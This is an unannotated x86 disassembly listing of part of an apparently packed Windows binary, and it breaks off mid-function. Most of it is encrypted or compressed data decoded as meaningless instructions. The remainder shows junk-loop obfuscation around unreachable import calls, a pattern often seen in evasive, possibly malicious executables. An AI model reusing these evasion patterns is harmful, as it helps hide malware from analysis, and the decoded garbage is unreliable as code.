  40baf9:	in     eax,0x9
  40bafb:	inc    eax
  40bafc:	and    edi,edx
  40bafe:	jns    0x40bacd
  40bb00:	add    BYTE PTR [edi+0xed58bdf],bh
  40bb06:	fadd   QWORD PTR [eax+0x628f2f04]
  40bb0c:	mov    eax,ds:0x6c9e00ba
  40bb11:	inc    ecx
  40bb12:	movnti DWORD PTR [esi-0x58a357a3],esp
  40bb19:	xchg   edx,ebp
  40bb1b:	sub    ecx,DWORD PTR [eax+0x5aad56b6]
  40bb21:	cmp    DWORD PTR [ebx+0x1f],ebx
  40bb24:	mov    cl,0x71
  40bb26:	fld    QWORD PTR [eax+0x2da6250f]
  40bb2c:	xchg   ebp,eax
  40bb2d:	xor    BYTE PTR [edx+ebp*1],cl
  40bb30:	cmp    BYTE PTR [eax],cl
  40bb32:	outs   dx,DWORD PTR ds:[esi]
  40bb33:	mov    ebx,0x85a2f41d
  40bb38:	sub    esi,ebx
  40bb3a:	dec    eax
  40bb3b:	cli    
  40bb3c:	(bad)  
  40bb3d:	lahf   
  40bb3e:	dec    ecx
  40bb3f:	mov    dl,0xb9
  40bb41:	xchg   ebp,eax
  40bb42:	inc    ecx
  40bb43:	inc    ebp
  40bb44:	xor    DWORD PTR [edi],edx
  40bb46:	mov    dh,BYTE PTR [ebp-0x47]
  40bb49:	mov    edi,0x3e4eade7
  40bb4e:	mov    BYTE PTR [edi+0x32],dl
  40bb51:	xchg   esp,eax
  40bb52:	rcr    DWORD PTR [ebx],0x37
  40bb55:	shl    BYTE PTR [eax+0x84076d8],1
  40bb5b:	shr    edi,1
  40bb5d:	pop    edi
  40bb5e:	(bad)  [ecx+0x25]
  40bb61:	sub    eax,0x53a2febd
  40bb66:	sub    esp,edi
  40bb68:	popf   
  40bb69:	loop   0x40bb44
  40bb6b:	mov    BYTE PTR [esi],ch
  40bb6d:	(bad)  
  40bb6e:	sbb    al,0x17
  40bb70:	mov    cl,0x84
  40bb72:	lods   eax,DWORD PTR ds:[esi]
  40bb73:	lods   al,BYTE PTR ds:[esi]
  40bb74:	add    ecx,DWORD PTR [esi]
  40bb76:	and    ch,BYTE PTR [eax+0x5b]
  40bb79:	jmp    0x1ed:0x80745980
  40bb80:	idiv   DWORD PTR [esi-0x48]
  40bb83:	add    eax,DWORD PTR [edi+eax*8-0x7338dae4]
  40bb8a:	xor    DWORD PTR [edx],esp
  40bb8c:	lea    ebp,[ebp-0x88933cf]
  40bb92:	lods   eax,DWORD PTR ds:[esi]
  40bb93:	xchg   ebp,eax
  40bb94:	das    
  40bb95:	cdq    
  40bb96:	xor    eax,0x16a1f82d
  40bb9b:	pop    edi
  40bb9c:	push   0x17
  40bb9e:	cmc    
  40bb9f:	ret    0x677a
  40bba2:	aaa    
  40bba3:	push   ebp
  40bba4:	sbb    DWORD PTR [edi-0x79],0x5
  40bba8:	lds    ecx,FWORD PTR [edi-0x3cdbbdc3]
  40bbae:	jmp    FWORD PTR [ebp+esi*4+0x5]
  40bbb2:	jecxz  0x40bb65
  40bbb4:	sub    BYTE PTR [edx+eax*1+0x52],ch
  40bbb8:	in     eax,dx
  40bbb9:	les    ecx,FWORD PTR [esi-0xd]
  40bbbc:	adc    eax,0x188452e8
  40bbc1:	mov    dh,0x93
  40bbc3:	divps  xmm3,XMMWORD PTR [esi+0x1ec68aa2]
  40bbca:	jne    0x40bb4d
  40bbcc:	out    dx,al
  40bbcd:	xor    al,bl
  40bbcf:	sbb    al,al
  40bbd1:	ja     0x40bbfe
  40bbd3:	xchg   edx,eax
  40bbd4:	add    al,0x14
  40bbd6:	push   ecx
  40bbd7:	jmp    0xdc6d23a7
  40bbdc:	loopne 0x40bb66
  40bbde:	xor    ecx,esp
  40bbe0:	sbb    al,0x87
  40bbe2:	jp     0x40bb75
  40bbe4:	dec    edi
  40bbe5:	mov    dl,BYTE PTR [esi-0xa0887a1]
  40bbeb:	mov    ecx,0x296b79e1
  40bbf0:	mov    esi,0x3a684b8e
  40bbf5:	xchg   edx,eax
  40bbf6:	inc    esi
  40bbf7:	pop    edi
  40bbf8:	dec    esi
  40bbf9:	jo     0x40bbf1
  40bbfb:	xchg   DWORD PTR [edx+0x3fef9c05],eax
  40bc01:	xor    BYTE PTR [edi],0x61
  40bc04:	shr    DWORD PTR [esi+0x296353ca],cl
  40bc0a:	rcl    BYTE PTR [ecx-0x1c],cl
  40bc0d:	scas   al,BYTE PTR es:[edi]
  40bc0e:	(bad)  
  40bc0f:	imul   ebx,DWORD PTR [ebp+0x1b1e7551],0xffffffb0
  40bc16:	sub    esp,DWORD PTR [ebx+0x523628de]
  40bc1c:	xor    dl,BYTE PTR [eax-0x17]
  40bc1f:	jle    0x40bc30
  40bc21:	sbb    eax,DWORD PTR [edx]
  40bc23:	mov    bh,0xd1
  40bc25:	jl     0x40bbc9
  40bc27:	cmp    al,0x64
  40bc29:	mov    ds:0x2bb1d9ff,al
  40bc2e:	loop   0x40bbeb
  40bc30:	mov    BYTE PTR [esi+0x1f],0xe0
  40bc34:	(bad)  
  40bc35:	out    0xe9,al
  40bc37:	or     DWORD PTR ds:0xd63332bb,eax
  40bc3d:	icebp  
  40bc3e:	aas    
  40bc3f:	fld    QWORD PTR [esi+ebx*4+0x3c]
  40bc43:	ja     0x40bbe0
  40bc45:	or     dl,al
  40bc47:	xchg   edi,eax
  40bc48:	ss inc eax
  40bc4a:	out    dx,al
  40bc4b:	or     al,dh
  40bc4d:	lahf   
  40bc4e:	lahf   
  40bc4f:	test   al,0x18
  40bc51:	jb     0x40bc1a
  40bc53:	or     dl,BYTE PTR [ecx+0x694782eb]
  40bc59:	mov    edx,0xb7c58fb7
  40bc5e:	retf   0x7d03
  40bc61:	sti    
  40bc62:	pop    ds
  40bc63:	dec    ebx
  40bc64:	popa   
  40bc65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc66:	sub    eax,DWORD PTR [ebx]
  40bc68:	jno    0x40bc16
  40bc6a:	cmp    dh,al
  40bc6c:	fs or  al,0x62
  40bc6f:	adc    eax,0x242a02c3
  40bc74:	ret    
  40bc75:	push   ebx
  40bc76:	addr16 jmp 0x3813f851
  40bc7c:	fnstenv [ecx+0x7e]
  40bc7f:	test   al,0x75
  40bc81:	outs   dx,DWORD PTR ds:[esi]
  40bc82:	push   eax
  40bc83:	clc    
  40bc84:	and    ecx,DWORD PTR [esi-0x580b35c4]
  40bc8a:	sbb    BYTE PTR [esi-0xe],al
  40bc8d:	push   es
  40bc8e:	push   es
  40bc8f:	mov    esi,0x4b418013
  40bc94:	xor    dh,BYTE PTR [esi-0x3d]
  40bc97:	sub    al,0x43
  40bc99:	jg     0x40bc99
  40bc9b:	ret    0x47a2
  40bc9e:	call   0x49f32b03
  40bca3:	dec    eax
  40bca4:	pop    ds
  40bca5:	jmp    0xe541:0xe4298220
  40bcac:	sbb    esi,edx
  40bcae:	test   ebp,0xae5008e7
  40bcb4:	dec    edi
  40bcb5:	and    DWORD PTR [edx+0x20f2f2b2],eax
  40bcbb:	scas   eax,DWORD PTR es:[edi]
  40bcbc:	push   esi
  40bcbd:	stc    
  40bcbe:	leave  
  40bcbf:	mov    edx,0x1874569a
  40bcc4:	cmp    eax,0x1001d687
  40bcc9:	cmp    eax,DWORD PTR [ebx]
  40bccb:	imul   ecx,esi,0xffffff80
  40bcce:	repz xlat BYTE PTR ds:[bx]
  40bcd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcd2:	mov    BYTE PTR ds:0xd2bfb6bf,0xcd
  40bcd9:	push   ds
  40bcda:	inc    ebp
  40bcdb:	mov    dl,0x40
  40bcdd:	sti    
  40bcde:	jle    0x40bd56
  40bce0:	ret    0x976d
  40bce3:	shr    dh,0xa9
  40bce6:	inc    esp
  40bce7:	dec    ecx
  40bce8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bce9:	push   eax
  40bcea:	xor    ah,BYTE PTR [esi]
  40bcec:	(bad)  
  40bcee:	retf   0xac15
  40bcf1:	cli    
  40bcf2:	sbb    dl,0x42
  40bcf5:	add    esi,ecx
  40bcf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcf8:	and    al,0xac
  40bcfa:	sub    DWORD PTR [edx-0x373fe2e],esi
  40bd00:	mov    ecx,0x13b0fe34
  40bd05:	sbb    bh,ah
  40bd07:	ret    0xde05
  40bd0a:	sub    DWORD PTR [edx-0xc],edx
  40bd0d:	stos   DWORD PTR es:[edi],eax
  40bd0e:	xor    ebx,esi
  40bd10:	push   0xebae0102
  40bd15:	(bad)  
  40bd16:	loopne 0x40bca7
  40bd18:	jmp    0x40bd05
  40bd1a:	ror    BYTE PTR [edx+0x4ddf105d],cl
  40bd20:	ja     0x40bcda
  40bd22:	mov    al,ds:0x7619099d
  40bd27:	fwait
  40bd28:	sbb    DWORD PTR [edi-0x66],0xf41467d
  40bd2f:	jo     0x40bd80
  40bd31:	pusha  
  40bd32:	ja     0x40bd49
  40bd34:	mov    esi,0x11fa255f
  40bd39:	jl     0x40bd76
  40bd3b:	mov    al,0x7d
  40bd3d:	mov    BYTE PTR [ebx+0xc9fbbf3],bl
  40bd43:	fcom   DWORD PTR [ebx+0x2f]
  40bd46:	add    BYTE PTR [ecx+0x53],ch
  40bd49:	pop    ds
  40bd4a:	pop    ecx
  40bd4b:	dec    ebp
  40bd4c:	sub    al,0xd1
  40bd4e:	pop    es
  40bd4f:	mov    ecx,DWORD PTR [ecx]
  40bd51:	mov    DWORD PTR [eax],ecx
  40bd53:	jmp    0x40c074
  40bd58:	out    0x4c,al
  40bd5a:	xor    al,0x30
  40bd5c:	mov    ah,0x70
  40bd5e:	loop   0x40bda8
  40bd60:	into   
  40bd61:	xor    BYTE PTR [ecx],bl
  40bd63:	xchg   esp,eax
  40bd64:	push   0x14
  40bd66:	or     BYTE PTR [ebx+0x1c],0x82
  40bd6a:	jle    0x40bdea
  40bd6c:	jp     0x40bdeb
  40bd6e:	jle    0x40bdee
  40bd70:	add    BYTE PTR [edi+0x42],ah
  40bd73:	call   ecx
  40bd75:	adc    bh,BYTE PTR [eax-0x4c]
  40bd78:	fnsave [edx-0x4e0fd97f]
  40bd7e:	mov    ah,0xac
  40bd80:	aad    0xd8
  40bd82:	jle    0x40bd96
  40bd84:	imul   ebp,esp,0xffffffde
  40bd87:	sbb    eax,0x1d38f55e
  40bd8c:	xchg   ebp,eax
  40bd8d:	lods   eax,DWORD PTR ds:[esi]
  40bd8e:	jo     0x40bd27
  40bd90:	sub    dh,ch
  40bd92:	sbb    ecx,DWORD PTR [edi+0x18]
  40bd95:	mov    ebx,0x4353f602
  40bd9a:	push   esi
  40bd9b:	cmp    eax,0x4cb4bae4
  40bda0:	cmp    DWORD PTR [eax],esp
  40bda2:	es sub eax,0xae69a9d4
  40bda8:	aaa    
  40bda9:	aaa    
  40bdaa:	pop    es
  40bdab:	outs   dx,BYTE PTR ds:[esi]
  40bdac:	push   ebx
  40bdad:	outs   dx,BYTE PTR ds:[esi]
  40bdae:	test   al,0x0
  40bdb0:	sub    eax,0xbb199e30
  40bdb5:	cs (bad) 
  40bdb7:	fnstenv [edi+eax*4-0x5e]
  40bdbb:	mov    eax,0xf7a7c37f
  40bdc0:	jg     0x40be26
  40bdc2:	mov    dl,0xde
  40bdc4:	out    0x4a,eax
  40bdc6:	in     al,dx
  40bdc7:	dec    edx
  40bdc8:	mov    dh,0x4
  40bdca:	fstp   st(4)
  40bdcc:	sar    DWORD PTR [esi-0x43],0x19
  40bdd0:	(bad)  
  40bdd1:	and    al,BYTE PTR [ebp-0x165d1228]
  40bdd7:	sbb    DWORD PTR [ebp-0x7f],eax
  40bdda:	push   edx
  40bddb:	pop    esp
  40bddc:	jmp    0x40bdcc
  40bdde:	pop    esi
  40bddf:	sub    ch,ch
  40bde1:	xor    eax,0xd25c6e0b
  40bde6:	adc    BYTE PTR [ebx-0x55],0xa
  40bdea:	aam    0xfe
  40bdec:	lahf   
  40bded:	and    dh,BYTE PTR [ebp-0x1fbab876]
  40bdf3:	int3   
  40bdf4:	or     dh,BYTE PTR [eax-0x477abc5c]
  40bdfa:	fild   WORD PTR [esi+edx*8+0xe]
  40bdfe:	jmp    0x40be73
  40be00:	xchg   ecx,eax
  40be01:	adc    DWORD PTR [ebx-0x2ea07df2],edi
  40be07:	push   eax
  40be08:	popf   
  40be09:	mov    ds:0x5af33143,al
  40be0e:	cdq    
  40be0f:	dec    edi
  40be10:	mov    esp,0x8949fad6
  40be15:	adc    BYTE PTR [edx],al
  40be17:	or     al,0x33
  40be19:	push   esi
  40be1a:	mov    eax,0xb1b63bf
  40be1f:	mov    ch,0x0
  40be21:	inc    esi
  40be22:	cmp    al,0xe8
  40be24:	ret    0xc011
  40be27:	cdq    
  40be28:	push   esp
  40be29:	pop    edi
  40be2a:	scas   eax,DWORD PTR es:[edi]
  40be2b:	xchg   ecx,edi
  40be2d:	rol    BYTE PTR [esi+0x2b21ce07],cl
  40be33:	cmp    ecx,DWORD PTR [edx]
  40be35:	ret    
  40be36:	dec    edi
  40be37:	mov    ds:0xe53c089,al
  40be3c:	inc    ebp
  40be3d:	ja     0x40be9a
  40be3f:	push   cs
  40be40:	xchg   esp,eax
  40be41:	bound  edx,QWORD PTR [ecx]
  40be43:	popf   
  40be44:	ds or  eax,0x4022f3eb
  40be4a:	outs   dx,DWORD PTR ds:[esi]
  40be4b:	mov    ch,0x67
  40be4d:	mov    esp,0x9f10775f
  40be52:	or     dh,bl
  40be54:	jo     0x40bea4
  40be56:	lds    ecx,FWORD PTR [ebx]
  40be58:	enter  0x35b9,0x83
  40be5c:	xor    DWORD PTR [edx],ebx
  40be5e:	aam    0x9a
  40be60:	push   ss
  40be61:	mov    eax,esi
  40be63:	push   edx
  40be64:	pushf  
  40be65:	ror    DWORD PTR [eax-0x27],cl
  40be68:	jbe    0x40bebf
  40be6a:	ins    DWORD PTR es:[edi],dx
  40be6b:	xor    dh,BYTE PTR [edx+ebp*1-0x37f3de98]
  40be72:	mov    esi,0x111bf2be
  40be77:	hlt    
  40be78:	xchg   BYTE PTR ds:0x64ddd0,al
  40be7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be7f:	xchg   DWORD PTR [ecx-0x2b],ecx
  40be82:	scas   al,BYTE PTR es:[edi]
  40be83:	jp     0x40be54
  40be85:	pushf  
  40be86:	or     al,0xb
  40be88:	fidivr DWORD PTR [ebp+0x7c]
  40be8b:	cmp    ebp,DWORD PTR [edx]
  40be8d:	int    0x9
  40be8f:	mov    edx,0x764e54d0
  40be94:	mov    dl,0x8b
  40be96:	push   es
  40be97:	xchg   ebp,eax
  40be98:	lods   al,BYTE PTR ds:[esi]
  40be99:	inc    edi
  40be9a:	das    
  40be9b:	cmp    ebp,DWORD PTR [eax-0xc23bd40]
  40bea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bea2:	je     0x40be54
  40bea4:	adc    ch,BYTE PTR [esi+0x6e]
  40bea7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bea8:	dec    DWORD PTR [si]
  40beab:	add    BYTE PTR [ecx+edx*1-0x35],al
  40beaf:	xor    ebp,DWORD PTR [ebp-0x1ad32f63]
  40beb5:	call   FWORD PTR [ecx]
  40beb7:	and    DWORD PTR [edi*8+0x3d333aa8],edi
  40bebe:	in     eax,0xf
  40bec0:	inc    BYTE PTR [esi+eax*2+0x4919f91e]
  40bec7:	in     eax,0xd
  40bec9:	iret   
  40beca:	mov    esi,0x96d80061
  40becf:	mov    BYTE PTR [esi-0x4ca6264f],bl
  40bed5:	mov    ah,0xd0
  40bed7:	push   ebx
  40bed8:	inc    edi
  40bed9:	push   es
  40beda:	inc    ebp
  40bedb:	pushf  
  40bedc:	fiadd  WORD PTR [edi]
  40bede:	jg     0x40bf23
  40bee0:	xchg   DWORD PTR [edx+ebp*8],edi
  40bee3:	and    BYTE PTR [eax-0x31],bh
  40bee6:	jb     0x40be95
  40bee8:	sbb    BYTE PTR [ebx],cl
  40beea:	add    dh,BYTE PTR [ebp-0x4b]
  40beed:	icebp  
  40beee:	push   ds
  40beef:	neg    DWORD PTR ds:0x7871309e
  40bef5:	push   ebx
  40bef6:	or     BYTE PTR [ebx-0x62],bl
  40bef9:	test   cl,ch
  40befb:	sbb    DWORD PTR [eax],esi
  40befd:	retf   0x79d5
  40bf00:	dec    edi
  40bf01:	xchg   esi,eax
  40bf02:	adc    ah,BYTE PTR [edx-0x15abc3fa]
  40bf08:	aad    0x7d
  40bf0a:	add    esp,DWORD PTR [ebp-0x7c]
  40bf0d:	inc    esp
  40bf0e:	aam    0xec
  40bf10:	mov    ebp,0x26ec8661
  40bf15:	cmp    DWORD PTR [eax-0x4c2eb17],edi
  40bf1b:	push   cs
  40bf1c:	pop    edx
  40bf1d:	ins    DWORD PTR es:[edi],dx
  40bf1e:	mov    DWORD PTR [edi+edi*4],0x54fb773d
  40bf25:	outs   dx,DWORD PTR ds:[esi]
  40bf26:	mov    bh,0xae
  40bf28:	mov    al,bh
  40bf2a:	sub    DWORD PTR [eax-0x758160a5],eax
  40bf30:	pop    edx
  40bf32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf33:	cmp    DWORD PTR [ebx-0x55ed8c98],0x2a8effd4
  40bf3d:	sahf   
  40bf3e:	outs   dx,DWORD PTR ds:[esi]
  40bf3f:	xlat   BYTE PTR ds:[ebx]
  40bf40:	mov    bh,0x69
  40bf42:	or     BYTE PTR [ecx-0x6b],0xfe
  40bf46:	jb     0x40bf17
  40bf48:	fnsave [edi]
  40bf4a:	inc    esi
  40bf4b:	loope  0x40bee7
  40bf4d:	inc    ebp
  40bf4e:	and    BYTE PTR [esi-0x1f311b7],dh
  40bf54:	pop    edi
  40bf55:	xor    BYTE PTR [eax+0x2f],0xe5
  40bf59:	cmp    DWORD PTR [ebx+0x4042909f],esi
  40bf5f:	in     al,0xc6
  40bf61:	lahf   
  40bf62:	clc    
  40bf63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf64:	cmp    edx,ebp
  40bf66:	xchg   ecx,eax
  40bf67:	sub    BYTE PTR [ecx],0x85
  40bf6a:	rcr    BYTE PTR [edi],0xc1
  40bf6d:	push   es
  40bf6e:	xor    al,0xd4
  40bf70:	inc    eax
  40bf71:	ror    BYTE PTR [esi],cl
  40bf73:	mov    eax,ds:0xdb6f615a
  40bf78:	pop    esp
  40bf79:	loop   0x40bf51
  40bf7b:	bound  ecx,QWORD PTR [esi+edi*4]
  40bf7e:	adc    esi,esp
  40bf80:	stc    
  40bf81:	fwait
  40bf82:	pop    ebp
  40bf83:	jae    0x40bf7f
  40bf85:	sub    esi,edi
  40bf87:	push   eax
  40bf88:	xlat   BYTE PTR ds:[ebx]
  40bf89:	xchg   edi,eax
  40bf8a:	hlt    
  40bf8b:	call   0xc694ac51
  40bf90:	fs call 0x3819:0x7e1b518f
  40bf98:	scas   eax,DWORD PTR es:[edi]
  40bf99:	hlt    
  40bf9a:	dec    ebp
  40bf9b:	and    BYTE PTR [esi],0x0
  40bf9e:	mov    dh,0x31
  40bfa0:	xor    eax,0xbcb6ed03
  40bfa5:	test   eax,0x89729623
  40bfaa:	pop    edx
  40bfab:	rol    BYTE PTR [edi-0x74227dc1],cl
  40bfb1:	pop    esi
  40bfb2:	std    
  40bfb3:	jb     0x40bfa5
  40bfb5:	ficomp WORD PTR [eax]
  40bfb7:	xor    cl,BYTE PTR [ebp-0x2b5bae3a]
  40bfbd:	loopne 0x40bf9f
  40bfbf:	imul   ah
  40bfc1:	(bad)  
  40bfc2:	jne    0x40bf6d
  40bfc4:	mov    bh,0xf
  40bfc6:	mov    BYTE PTR [edi],ah
  40bfc8:	mov    edi,0x2b2884ca
  40bfcd:	out    0x31,eax
  40bfcf:	add    BYTE PTR cs:[ecx+edx*1],ch
  40bfd3:	mov    esp,0x382d322f
  40bfd8:	not    BYTE PTR [ecx-0x53]
  40bfdb:	rcl    BYTE PTR [ebx],0xed
  40bfde:	cwde   
  40bfdf:	cmp    eax,0x9fc7b09d
  40bfe4:	fs retf 0x5750
  40bfe8:	icebp  
  40bfe9:	ja     0x40bf8f
  40bfeb:	mov    ebp,0xd44e3617
  40bff0:	nop
  40bff1:	inc    eax
  40bff2:	das    
  40bff3:	out    dx,al
  40bff4:	addr16 ss push ss
  40bff7:	add    eax,0xad93f749
  40bffc:	repnz (bad) 
  40bffe:	fisub  DWORD PTR [esi-0x67c62e5c]
  40c004:	sbb    BYTE PTR [edx+0x16],dl
  40c007:	mov    BYTE PTR [esi],ah
  40c009:	xchg   ebx,eax
  40c00a:	jae    0x40bfa2
  40c00c:	or     dh,BYTE PTR [esi-0x2d]
  40c00f:	mov    ds:0xe64b8073,al
  40c014:	push   0x2f611ef8
  40c019:	loopne 0x40c092
  40c01b:	enter  0xee7b,0x38
  40c01f:	jbe    0x40c029
  40c021:	and    eax,0x3e8f3b21
  40c026:	not    DWORD PTR [esi+0x8]
  40c029:	jnp    0x40bfdc
  40c02b:	popa   
  40c02c:	mov    ecx,0x274e484a
  40c031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c032:	jne    0x40bfe4
  40c034:	out    0x85,al
  40c036:	pop    esp
  40c037:	fsub   QWORD PTR [edi+0x5f]
  40c03a:	fst    QWORD PTR [ebx]
  40c03c:	bound  edx,QWORD PTR [edi+0x5d57b59e]
  40c042:	lahf   
  40c043:	adc    edi,DWORD PTR [esi-0x6e]
  40c046:	and    BYTE PTR [ebx-0x19],dh
  40c049:	test   BYTE PTR [ebx],dl
  40c04b:	outs   dx,DWORD PTR ds:[esi]
  40c04c:	ds pcmpeqw mm5,mm7
  40c050:	and    BYTE PTR [ebx-0x6440fec3],ah
  40c056:	or     ebp,DWORD PTR [ebx-0x1e]
  40c059:	mov    BYTE PTR [edi-0xa],cl
  40c05c:	fist   WORD PTR [ebp-0x3fdffe48]
  40c062:	test   al,0xfa
  40c064:	rcl    DWORD PTR [edi-0x31],1
  40c067:	stos   BYTE PTR es:[edi],al
  40c068:	pop    edx
  40c069:	je     0x40c01c
  40c06b:	mov    bh,0x29
  40c06d:	jge    0x40c09e
  40c06f:	into   
  40c070:	jmp    0x8bb42eb0
  40c075:	inc    ebp
  40c076:	or     al,0x8b
  40c078:	inc    ebp
  40c079:	or     bh,bh
  40c07b:	jne    0x40c075
  40c07d:	call   0x40746a
  40c082:	mov    eax,DWORD PTR [ebp-0xc]
  40c085:	cmp    eax,ebx
  40c087:	je     0x4098f8
  40c08d:	mov    eax,DWORD PTR [ebp-0x8]
  40c090:	mov    eax,DWORD PTR [eax]
  40c092:	pop    edi
  40c093:	pop    esi
  40c094:	pop    ebx
  40c095:	leave  
  40c096:	ret    0xc
  40c099:	push   ebp
  40c09a:	mov    ebp,esp
  40c09c:	sub    esp,0x30
  40c09f:	adc    DWORD PTR ds:0x433717,ecx
  40c0a5:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40c0ac:	xor    ecx,ecx
  40c0ae:	or     ecx,DWORD PTR ds:0x433727
  40c0b4:	and    DWORD PTR ds:0x433783,ecx
  40c0ba:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40c0c1:	mov    ecx,DWORD PTR [ebp-0x4]
  40c0c4:	mov    DWORD PTR ds:0x4337b7,0x13
  40c0ce:	cmp    DWORD PTR ds:0x4337b7,0x0
  40c0d5:	je     0x40c103
  40c0db:	cmp    DWORD PTR ds:0x4337b7,0x1a
  40c0e2:	jne    0x40c0f3
  40c0e8:	push   0x1b76
  40c0ed:	call   DWORD PTR ds:0x412020
  40c0f3:	mov    eax,ds:0x4337b7
  40c0f8:	dec    eax
  40c0f9:	mov    ds:0x4337b7,eax
  40c0fe:	jmp    0x40c0ce
  40c103:	push   ebx
  40c104:	mov    DWORD PTR ds:0x4337e7,0x19
  40c10e:	cmp    DWORD PTR ds:0x4337e7,0x0
  40c115:	je     0x40c1bf
  40c11b:	cmp    DWORD PTR ds:0x4337e7,0xa
  40c122:	jne    0x40c133
  40c128:	push   0x4904
  40c12d:	call   DWORD PTR ds:0x412024
  40c133:	cmp    DWORD PTR ds:0x4337e7,0xb
  40c13a:	jne    0x40c14d
  40c140:	mov    ebx,DWORD PTR ds:0x4337e7
  40c146:	dec    ebx
  40c147:	mov    DWORD PTR ds:0x4337e7,ebx
  40c14d:	mov    ebx,DWORD PTR ds:0x4337e7
  40c153:	dec    ebx
  40c154:	mov    DWORD PTR ds:0x4337e7,ebx
  40c15a:	jmp    0x40c10e
  40c15f:	mov    DWORD PTR ds:0x433783,0x1d
  40c169:	cmp    DWORD PTR ds:0x433783,0x0
  40c170:	je     0x40c1bf
  40c176:	cmp    DWORD PTR ds:0x433783,0x3
  40c17d:	jne    0x40c193
  40c183:	push   0x433880
  40c188:	push   0x400000
  40c18d:	call   DWORD PTR ds:0x412028
  40c193:	cmp    DWORD PTR ds:0x433783,0x4
  40c19a:	jne    0x40c1ad
  40c1a0:	mov    ebx,DWORD PTR ds:0x433783
  40c1a6:	dec    ebx
  40c1a7:	mov    DWORD PTR ds:0x433783,ebx
  40c1ad:	mov    ebx,DWORD PTR ds:0x433783
  40c1b3:	dec    ebx
  40c1b4:	mov    DWORD PTR ds:0x433783,ebx
  40c1ba:	jmp    0x40c169
  40c1bf:	mov    eax,0x7510854
  40c1c4:	adc    ebx,DWORD PTR ds:0x4337ab
  40c1ca:	xor    ecx,eax
  40c1cc:	mov    ebx,0x32729b
  40c1d1:	add    ecx,ebx
  40c1d3:	mov    DWORD PTR [ebp-0x1c],ecx
  40c1d6:	movzx  ecx,BYTE PTR ds:0x4337b7
  40c1dd:	xor    DWORD PTR ds:0x433713,ecx
  40c1e3:	mov    ecx,DWORD PTR [ebp+0x14]
  40c1e6:	or     DWORD PTR ds:0x43371b,0x43377b
  40c1f0:	push   esi
  40c1f1:	push   edi
  40c1f2:	test   ecx,ecx
  40c1f4:	mov    DWORD PTR ds:0x43372b,0x6070
  40c1fe:	je     0x40c2fb
  40c204:	mov    ecx,DWORD PTR [ebp+0x14]
  40c207:	mov    DWORD PTR ds:0x4337a7,0x1d
  40c211:	cmp    DWORD PTR ds:0x4337a7,0x0
  40c218:	je     0x40c2a6
  40c21e:	cmp    DWORD PTR ds:0x4337a7,0x29
  40c225:	jne    0x40c23a
  40c22b:	push   DWORD PTR [ebp-0xc]
  40c22e:	push   DWORD PTR [ebp-0x1c]
  40c231:	push   DWORD PTR [ebp-0x20]
  40c234:	call   DWORD PTR ds:0x41202c
  40c23a:	xor    esi,esi
  40c23c:	or     esi,DWORD PTR ds:0x4337a7
  40c242:	dec    esi
  40c243:	mov    DWORD PTR ds:0x4337a7,esi
  40c249:	jmp    0x40c211
  40c24e:	mov    DWORD PTR ds:0x4337eb,0x10
  40c258:	cmp    DWORD PTR ds:0x4337eb,0x0
  40c25f:	je     0x40c2a6
  40c265:	cmp    DWORD PTR ds:0x4337eb,0x2
  40c26c:	jne    0x40c278
  40c272:	call   DWORD PTR ds:0x4121d8
  40c278:	cmp    DWORD PTR ds:0x4337eb,0x3
  40c27f:	jne    0x40c292
  40c285:	mov    esi,DWORD PTR ds:0x4337eb
  40c28b:	dec    esi
  40c28c:	mov    DWORD PTR ds:0x4337eb,esi
  40c292:	mov    esi,DWORD PTR ds:0x4337eb
  40c298:	dec    esi
  40c299:	mov    DWORD PTR ds:0x4337eb,esi
  40c29f:	jmp    0x40c258
  40c2a4:	and    esi,edi
  40c2a6:	mov    ecx,DWORD PTR [ecx]
  40c2a8:	and    DWORD PTR ds:0x433733,0x0
  40c2b2:	jmp    0x40c2c4
  40c2b7:	mov    esi,DWORD PTR ds:0x433733
  40c2bd:	inc    esi
  40c2be:	mov    DWORD PTR ds:0x433733,esi
  40c2c4:	cmp    DWORD PTR ds:0x433733,0x15
  40c2cb:	jae    0x40c2f8
  40c2d1:	cmp    DWORD PTR ds:0x433733,0x1e
  40c2d8:	jne    0x40c2ed
  40c2de:	push   DWORD PTR [ebp-0xc]
  40c2e1:	push   DWORD PTR [ebp-0x1c]
  40c2e4:	push   DWORD PTR [ebp-0x18]
  40c2e7:	call   DWORD PTR ds:0x4123a4
  40c2ed:	jmp    0x40c2b7
  40c2f2:	sbb    DWORD PTR ds:0x4337f3,edx
  40c2f8:	mov    DWORD PTR [ebp-0x1c],ecx
  40c2fb:	mov    ecx,DWORD PTR ds:0x4337eb
  40c301:	adc    DWORD PTR ds:0x4337fb,ecx
  40c307:	imul   edx,eax
  40c30a:	mov    esi,DWORD PTR ds:0x43374b
  40c310:	xor    ecx,ecx
  40c312:	or     ecx,DWORD PTR ds:0x433787
  40c318:	sub    esi,ecx
  40c31a:	or     esi,DWORD PTR [esi+ecx*1]
  40c31d:	mov    ecx,0x4573
  40c322:	mov    esi,DWORD PTR ds:0x4337e3
  40c328:	mov    esi,DWORD PTR [esi]
  40c32a:	sub    DWORD PTR ds:0x43372f,esi
  40c330:	add    edx,ecx
  40c332:	mov    esi,0x7879
  40c337:	and    DWORD PTR ds:0x4337a7,edi
  40c33d:	mov    edi,0x1556
  40c342:	sbb    DWORD PTR ds:0x433733,0x433767
  40c34c:	xchg   esi,ecx
  40c34e:	and    DWORD PTR ds:0x4337ff,0x0
  40c358:	xor    ecx,ecx
  40c35a:	add    ecx,DWORD PTR ds:0x4337ff
  40c360:	inc    ecx
  40c361:	mov    DWORD PTR ds:0x4337ff,ecx
  40c367:	cmp    DWORD PTR ds:0x4337ff,0xf
  40c36e:	jne    0x40c37f
  40c374:	push   0x8dd2
  40c379:	call   DWORD PTR ds:0x4121dc
  40c37f:	cmp    DWORD PTR ds:0x4337ff,0xe
  40c386:	jne    0x40c399
